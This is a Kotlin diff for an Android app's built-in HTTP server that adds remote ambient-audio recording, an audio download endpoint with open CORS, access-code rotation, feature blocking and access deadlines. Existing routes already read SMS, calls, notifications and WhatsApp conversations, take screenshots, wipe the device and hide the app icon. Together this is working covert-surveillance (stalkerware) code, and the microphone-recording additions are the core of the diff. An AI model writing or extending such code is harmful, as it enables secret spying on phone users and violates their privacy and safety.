@@ -48,7 +48,11 @@ class Httpd(ctxIn: Context, private val porta: Int) {
         "/geofences", "/geofence-add", "/geofence-remove", "/geofence-toggle", "/geofence-events",
         "/at-estado", "/at-ativar", "/at-desativar", "/at-bloquear", "/at-alarme", "/at-wipe", "/screenshot",
         "/captura", "/sms", "/calls", "/notifs", "/apps",
-        "/icone-esconder", "/icone-mostrar", "/icone-estado")
+        "/icone-esconder", "/icone-mostrar", "/icone-estado",
+        "/ambiente", "/ambiente-parar", "/ambiente-estado",
+        "/codigos", "/codigos-renovar",
+        "/funcoes", "/funcao-bloquear", "/funcao-desbloquear",
+        "/prazo", "/prazo-definir", "/prazo-revogar")
 
     private fun atender(s: Socket) {
         try {
@@ -89,6 +93,7 @@ class Httpd(ctxIn: Context, private val porta: Int) {
             val agora = System.currentTimeMillis()
             if (caminho != "/login" && caminho != "/" && caminho != "/logo") {
                 if (agora < bloqueioAte) { enviar(out, 429, "application/json", "{\"erro\":\"bloqueado\"}".toByteArray()); return }
+                if (Prefs.prazoAtivo(ctx)) { enviar(out, 403, "application/json", "{\"erro\":\"expirado\"}".toByteArray()); return }
                 if (chave != code()) { enviar(out, 401, "application/json", "{\"erro\":\"codigo\"}".toByteArray()); return }
             }
             // Modo Avançado: além do código normal, exige o 2.º código (cabeçalho X-Adv ou ?a2=).
@@ -181,6 +186,16 @@ class Httpd(ctxIn: Context, private val porta: Int) {
                             out.write(bos.toByteArray()); out.flush()
                         } catch (_: Exception) {}
                     } else enviar(out, 404, "application/json", "{\"erro\":\"nao_encontrada\"}".toByteArray())
+                }
+                // ── Áudio ambiente (download) ─────────────────────────────────
+                caminho == "/audio" -> {
+                    val bytes = AmbientRecorder.ultimaGravacao
+                    if (bytes != null) {
+                        try {
+                            out.write(("HTTP/1.1 200 OK\r\nContent-Type: audio/aac\r\nContent-Disposition: attachment; filename=\"ambiente_" + System.currentTimeMillis() + ".aac\"\r\nContent-Length: " + bytes.size + "\r\nCache-Control: no-store\r\nAccess-Control-Allow-Origin: *\r\nConnection: close\r\n\r\n").toByteArray())
+                            out.write(bytes); out.flush()
+                        } catch (_: Exception) {}
+                    } else enviar(out, 404, "application/json", "{\"erro\":\"sem_gravacao\"}".toByteArray())
                 }
                 // ── WhatsApp ──────────────────────────────────────────────────
                 caminho == "/wa-convs" -> {
@@ -336,6 +351,44 @@ class Httpd(ctxIn: Context, private val porta: Int) {
             "/icone-estado" -> r.put("visivel", Device.iconeVisivel(ctx))
             "/icone-esconder" -> { Device.esconderIcone(ctx); r.put("ok", true) }
             "/icone-mostrar" -> { Device.mostrarIcone(ctx); r.put("ok", true) }
+            // ── Áudio ambiente ───────────────────────────────────────────────
+            "/ambiente" -> {
+                val seg = b.optInt("segundos", 30).coerceIn(5, 300)
+                if (AmbientRecorder.gravando) {
+                    r.put("ok", false).put("erro", "ja_gravando")
+                } else {
+                    AmbientRecorder.gravar(ctx, seg) {}
+                    r.put("ok", true).put("segundos", seg)
+                }
+            }
+            "/ambiente-parar" -> { AmbientRecorder.parar(); r.put("ok", true) }
+            "/ambiente-estado" -> r.put("estado", AmbientRecorder.estado())
+            // ── Gestão de códigos ────────────────────────────────────────────
+            "/codigos" -> r
+                .put("code", Prefs.code(ctx))
+                .put("code2", Prefs.code2(ctx))
+                .put("prazo", Prefs.prazoAcesso(ctx))
+                .put("bloqueadas", org.json.JSONArray(Prefs.funcosBloqueadas(ctx).toList()))
+            "/codigos-renovar" -> {
+                val (c1, c2) = Prefs.renovarCodigos(ctx)
+                r.put("code", c1).put("code2", c2).put("ok", true)
+            }
+            // ── Funcionalidades bloqueadas ───────────────────────────────────
+            "/funcoes" -> r.put("bloqueadas", org.json.JSONArray(Prefs.funcosBloqueadas(ctx).toList()))
+            "/funcao-bloquear" -> { Prefs.bloquearFuncao(ctx, b.optString("funcao")); r.put("ok", true) }
+            "/funcao-desbloquear" -> { Prefs.desbloquearFuncao(ctx, b.optString("funcao")); r.put("ok", true) }
+            // ── Prazo de acesso ──────────────────────────────────────────────
+            "/prazo" -> r.put("prazo", Prefs.prazoAcesso(ctx)).put("expirado", Prefs.prazoAtivo(ctx))
+            "/prazo-definir" -> {
+                val ts = when {
+                    b.has("ts") -> b.getLong("ts")
+                    b.has("horas") -> System.currentTimeMillis() + b.getLong("horas") * 3_600_000L
+                    b.has("dias") -> System.currentTimeMillis() + b.getLong("dias") * 86_400_000L
+                    else -> 0L
+                }
+                Prefs.setPrazoAcesso(ctx, ts); r.put("ok", true).put("prazo", ts)
+            }
+            "/prazo-revogar" -> { Prefs.setPrazoAcesso(ctx, 0L); r.put("ok", true) }
             "/at-wipe" -> {
                 if (b.optBoolean("confirmar", false)) r.put("ok", AntiTheft.apagarDados(ctx))
                 else r.put("ok", false).put("erro", "confirmar_obrigatorio")
